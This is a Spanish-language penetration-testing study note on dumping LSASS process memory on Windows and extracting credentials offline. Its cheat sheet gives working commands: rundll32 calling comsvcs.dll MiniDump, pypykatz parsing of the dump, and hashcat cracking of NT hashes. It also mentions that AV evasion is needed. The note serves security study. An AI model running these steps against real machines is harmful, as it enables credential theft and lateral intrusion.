---
tags:
  - windows
  - lsass
---
## Conceptos Clave (TL;DR)

* LSASS (Local Security Authority Subsystem Service) es un proceso central de Windows responsable de hacer cumplir políticas de seguridad, manejar autenticación y almacenar credenciales en memoria.

* Tras el inicio de sesión, LSASS almacena credenciales localmente en la memoria, crea tokens de acceso y escribe en el log de seguridad de Windows.

* Generar un volcado de memoria (memory dump) de LSASS permite tomar una "captura" de las sesiones activas y extraer credenciales offline desde la máquina atacante.

* Atacar offline otorga mayor flexibilidad de velocidad y minimiza el tiempo de interacción directa con el sistema objetivo.

## Herramientas Clave

* **Task Manager**: Herramienta gráfica nativa de Windows utilizada para crear volcados de memoria cuando se tiene acceso a una sesión interactiva (GUI).

* **Rundll32.exe & Comsvcs.dll**: Utilidad nativa de línea de comandos para generar volcados de memoria, ideal para sesiones remotas sin interfaz gráfica.

* **Pypykatz**: Implementación en Python de Mimikatz que permite parsear y extraer secretos de archivos de volcado de memoria de forma offline en sistemas Linux.

* **[Hashcat](../../../📂%2008%20Herramientas&Cheatsheets/Hashcat.md)**: Herramienta de cracking utilizada para romper hashes NT recuperados del proceso LSASS.


## Metodología Paso a Paso


* **Fase 1: Identificación del Proceso LSASS.** 
	Antes de interactuar con LSASS a través de línea de comandos, es obligatorio identificar qué Process ID (PID) tiene asignado el proceso `lsass.exe` en el sistema objetivo.

* **Fase 2: Creación del Volcado de Memoria (Memory Dump).** 
	Se utiliza una utilidad nativa (gráfica o de consola) para extraer toda la memoria de LSASS y guardarla en un archivo físico `.DMP`.

* **Fase 3: Exfiltración.** 
	Transferir el archivo `.DMP` generado desde la máquina comprometida hacia el entorno controlado del atacante para su análisis seguro y silencioso.

* **Fase 4: Extracción Offline de Credenciales.** 
	Analizar el volcado con Pypykatz para extraer hashes (MSV), contraseñas en texto claro (WDIGEST), tickets (Kerberos) y claves maestras (DPAPI).

* **Fase 5: Cracking.** 
	En caso de que las credenciales recuperadas estén cifradas (ej. hashes NT del paquete MSV), someterlas a un ataque de diccionario utilizando Hashcat.

  
## Cheat Sheet de Comandos

```cmd
# Encuentra el proceso lsass.exe y muestra su PID a través de cmd usando tasklist.

tasklist /svc
```

```powershell
# Alternativa en PowerShell para obtener el PID específico de lsass.

Get-Process lsass
```

```powershell
# Ejecuta comsvcs.dll mediante rundll32 para llamar a la función MiniDumpWriteDump.
# Crea un volcado de memoria completo en la ruta especificada. Requiere privilegios elevados.

rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS_PID> <TARGET_DUMP_PATH> full
```

```bash
# Ejecuta pypykatz en la máquina atacante para analizar el archivo de volcado offline.
# Utiliza el módulo lsa minidump para extraer MSV, WDIGEST, Kerberos y DPAPI.

pypykatz lsa minidump <LOCAL_DUMP_PATH>
```

```bash
# Inicia un ataque de diccionario contra un hash NT (modo 1000) extraído del volcado.

sudo hashcat -m 1000 <NT_HASH> <WORDLIST_PATH>
```

## "Gotchas" y Troubleshooting

* **Alerta de Evasión de AV:** El uso de `rundll32.exe` para llamar a `comsvcs.dll` es ampliamente detectado como actividad maliciosa por herramientas Anti-Virus modernas, las cuales prevendrán su ejecución. Será necesario implementar técnicas de bypass de AV para que este vector funcione en sistemas actualizados.

* **Requisitos de Interfaz:** El método del Task Manager es estrictamente dependiente de contar con una sesión interactiva basada en GUI con el objetivo. El método de PowerShell requiere una sesión elevada.

* **Ubicación del Archivo (Task Manager):** Al usar el método gráfico mediante Task Manager, el archivo generado suele denominarse `lsass.DMP` y se guarda por defecto en el directorio `%temp%`.

* **Disponibilidad de WDIGEST:** Este protocolo almacenaba credenciales en texto claro por defecto en sistemas antiguos (Windows XP - 8 y Server 2003 - 2012). En sistemas operativos modernos, WDIGEST está deshabilitado por defecto mediante una actualización de seguridad de Microsoft.